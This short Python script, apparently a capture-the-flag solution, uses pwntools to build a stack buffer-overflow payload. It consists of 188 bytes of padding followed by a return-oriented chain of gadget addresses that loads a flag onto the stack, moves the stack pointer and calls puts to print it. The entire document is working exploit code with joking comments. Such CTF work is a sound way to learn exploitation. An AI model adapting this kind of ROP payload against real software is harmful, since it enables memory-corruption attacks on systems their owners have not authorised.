# this is meme lol
from pwn import *
flag_addr = p32(0x80491e3)  # flag will load flag contents onto stack but not print
print_eax = p32(0x804921f)  # just a push eax and puts(eax)

pad = p32(0xdeadbeef)

shrink_stack = p32(0x804901b)  # need to make sure our flag on the stack isn't overwritten by internal functions

# since shrink_stack will grow the stack down by 8 bytes and pop 4 bytes, give 3 bytes of padding for each 8 byte growth

print("AAAA" * 47 + flag_addr + pad + (18 * (shrink_stack + pad * 3)) + print_eax)

# lmao
